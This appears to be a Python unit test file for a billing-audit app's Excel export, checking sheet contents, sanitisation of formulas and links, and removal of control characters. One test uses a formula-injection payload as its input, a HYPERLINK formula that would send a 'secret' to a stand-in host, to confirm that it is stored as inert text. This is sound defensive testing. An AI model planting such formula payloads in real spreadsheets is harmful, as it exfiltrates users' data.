import io
import unittest
import zipfile

from openpyxl import load_workbook

from billing.audit import audit_bill
from billing.excel import workbook_bytes
from billing.knowledge import KnowledgeBase
from billing.samples import sample_bill


class ExcelTests(unittest.TestCase):
    def test_local_profile_and_review_export(self):
        kb = KnowledgeBase()
        bill = sample_bill("Issues to find")
        state = {"bill": bill.model_dump(mode="json"), "audit": audit_bill(bill, kb), "cloud_eligible": False}
        data = workbook_bytes({"name": "PRIVATE_LOCAL_NAME", "age": 57, "sex": "Female", "reference": "REF-LOCAL"}, state, kb)
        book = load_workbook(io.BytesIO(data))
        self.assertEqual(book.sheetnames, ["Summary", "Charges", "Findings", "References"])
        self.assertEqual(book["Summary"]["B5"].value, "PRIVATE_LOCAL_NAME")
        self.assertEqual(book["Summary"]["B6"].value, 57)
        self.assertEqual(book["Summary"]["B15"].value, 840)
        self.assertEqual(book["Summary"]["B16"].value, 340)
        self.assertEqual(book["Charges"].max_row, 9)
        self.assertEqual(book["Findings"].max_row, 10)
        self.assertEqual(state["bill"]["patient"], "Alex Example")

    def test_user_text_cannot_become_excel_formulas_or_links(self):
        attack = '=HYPERLINK("https://invalid.example/?secret=PRIVATE","Click")'
        data = workbook_bytes({"name": attack, "reference": "+malicious"})
        book = load_workbook(io.BytesIO(data))
        self.assertEqual(book["Summary"]["B5"].value, attack)
        self.assertEqual(book["Summary"]["B5"].data_type, "s")
        self.assertTrue(all(cell.data_type != "f" and cell.hyperlink is None for sheet in book for row in sheet for cell in row))
        with zipfile.ZipFile(io.BytesIO(data)) as archive:
            self.assertFalse(any("externalLink" in name for name in archive.namelist()))

    def test_invalid_control_characters_do_not_break_download(self):
        data = workbook_bytes({"name": "Local\x00Name"})
        book = load_workbook(io.BytesIO(data))
        self.assertEqual(book["Summary"]["B5"].value, "LocalName")


if __name__ == "__main__":
    unittest.main()
